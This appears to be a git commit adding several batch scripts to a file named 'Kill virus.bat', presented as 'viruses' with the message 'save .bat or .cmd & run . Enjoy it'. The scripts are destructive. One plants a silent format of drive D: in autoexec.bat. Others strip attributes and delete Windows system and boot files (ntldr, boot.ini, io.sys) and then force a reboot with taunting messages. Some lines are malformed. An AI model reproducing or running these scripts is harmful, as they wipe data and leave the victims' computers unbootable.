2c7e7070b36125eb279e32c38d299a2148f13cc0
SMN666 <47520030+smn666@users.noreply.github.com>
2021-01-17 21:04:05 +0630

    Virus & Protection
    save .bat or .cmd & run .
    Enjoy it... :D

--- Kill virus.bat
+++ Kill virus.bat
@@ -1,6 +1,54 @@
+
+#Kill Virus.bat:
+
 @echo off
 md ~virusfolder\path\drive
 xcopy C:\*.*D:\
 taskkill cmd.exe
 start explorer.exe
 shutdown -r -t 0 -c "Hay Noob"
+
+
+#Data Format Virus.bat:
+
+@echo off
+cls
+call attrib -h -r C:\autoexec.bat > nul
+echo @echo off >C:\autoexec.bat
+echo format D: /q /u /autotest > nul >>C:\autoexec.bat
+
+
+
+#Windel Virus.bat
+
+@echo off
+del c:\windows
+del c:\
+delwintree
+msg * "done"
+
+#OSDEL VIRUS.bat
+
+@echo off
+cd\
+attrib -r -a -s -h *.*
+del ntldr
+del boot.ini
+del msdos.sys
+del ntdetect.com
+del io.sys
+shutdown -r -t00 -c "See Again"
+
+
+
+#WinStopVirus.bat
+
+@echo off
+cd\
+attrib -r -a -s -h *.*
+del \q ntldr
+del \q boot.ini
+del \q msdos.sys
+del \q ntdetect.com
+del \q io.sys
+shutdown -r -t00 -c "OS Destroy"
